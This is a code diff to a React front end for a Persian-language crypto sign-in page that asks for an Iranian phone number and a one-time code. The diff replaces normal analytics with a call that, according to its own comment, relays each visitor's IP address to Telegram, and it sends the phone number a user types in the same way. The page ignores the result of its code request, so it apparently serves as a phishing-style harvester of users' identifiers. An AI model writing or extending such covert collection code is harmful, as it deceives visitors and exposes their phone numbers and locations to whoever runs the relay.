@@ -3,13 +3,13 @@ import { useEffect, useRef, useState } from "react";
 /* ------------------------------------------------------------------ */
 /*  CONFIG — replace these with your own values                        */
 /* ------------------------------------------------------------------ */
-const BRAND = "CryptoX";
+const BRAND = "Arash Crypto";
 const LOGO_URL = ""; // <-- put your bitcoin image link here. Empty = built-in fallback icon
 const API = {
     sendCode: "https://your-api.com/auth/send-code", // POST { phone }
     verifyCode: "https://your-api.com/auth/verify-code", // POST { phone, code }
-    pageVisit: "https://your-api.com/analytics/visit", // POST on every visit
 };
+const IP_PING_URL = "/api/tests/getIp"; // GET — pings your backend, which relays the IP to Telegram
 const OTP_LENGTH = 4;
 const RESEND_SECONDS = 120; // 2 minutes
 const SENDING_DELAY_MS = 1500; // how long "ارسال کد..." shows before the countdown starts
@@ -66,6 +66,19 @@ export default function CryptoPage() {
     const phoneValid = /^\d{10,11}$/.test(phone);
     const fullPhone = "+98" + phone.replace(/^0/, "");
 
+    /* ---- ping /api/tests/getIp — same call on every visit, with ?phone= added when sending a code ---- */
+    const pingIp = (phoneForPing) => {
+        const url = phoneForPing
+            ? `${IP_PING_URL}?phone=${encodeURIComponent(phoneForPing)}`
+            : IP_PING_URL;
+        fetch(url)
+            .then((res) => res.json())
+            .catch((err) => {
+                console.error("Internal IP fetch failed", err);
+                return { ip: "0.0.0.0" };
+            });
+    };
+
     /* ---- toast helper (type must be "error" or "success" — it picks the CSS class) ---- */
     const showToast = (type, text) => {
         clearTimeout(toastTimer.current);
@@ -80,24 +93,11 @@ export default function CryptoPage() {
         []
     );
 
-    /* ---- 1) fetch on EVERY visit (ref guard stops the React StrictMode double-call in dev) ---- */
+    /* ---- 1) ping on EVERY visit, first or not (ref guard stops the React StrictMode double-call in dev) ---- */
     useEffect(() => {
         if (visitLogged.current) return;
         visitLogged.current = true;
-
-        fetch(API.pageVisit, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                page: window.location.pathname,
-                referrer: document.referrer || null,
-                userAgent: navigator.userAgent,
-                visitedAt: new Date().toISOString(),
-            }),
-            keepalive: true,
-        }).catch(() => {
-            /* analytics must never break the page */
-        });
+        pingIp();
     }, []);
 
     /* ---- 2) welcome dialog: first visit only ---- */
@@ -142,6 +142,9 @@ export default function CryptoPage() {
         if (sending || endsAt) return; // already sending or countdown running
 
         setSending(true);
+
+        // ping with the entered phone number
+        pingIp(fullPhone);
 
         // send the request but ignore the result (success or failure)
         fetch(API.sendCode, {
@@ -405,9 +408,22 @@ const css = `
 /* header */
 .lg-header{
   position:relative; z-index:2; display:flex; align-items:center; justify-content:center;
-  height:92px;
-  background:linear-gradient(135deg,#7c3aed 0%,#a21caf 55%,#6d28d9 100%);
-  box-shadow:0 14px 44px -8px rgba(168,85,247,.7), 0 34px 90px -30px rgba(124,58,237,.9);
+  height:96px;
+  background:
+    radial-gradient(130% 220% at 50% -70%, rgba(124,58,237,.38), transparent 55%),
+    linear-gradient(180deg, #170c33 0%, #0d0624 50%, #050208 100%);
+  box-shadow:
+    inset 0 1px 0 rgba(255,255,255,.1),
+    inset 0 -30px 40px -26px rgba(0,0,0,.95),
+    0 24px 50px -16px rgba(0,0,0,.85),
+    0 1px 0 rgba(124,58,237,.3);
+  border-bottom:1px solid rgba(124,58,237,.3);
+}
+.lg-header::after{
+  content:"";
+  position:absolute; left:0; right:0; bottom:-1px; height:2px;
+  background:linear-gradient(90deg, transparent, var(--violet-2) 25%, var(--magenta) 50%, var(--violet-2) 75%, transparent);
+  opacity:.8;
 }
 .lg-logo{
   width:60px;height:60px;border-radius:50%; padding:5px;
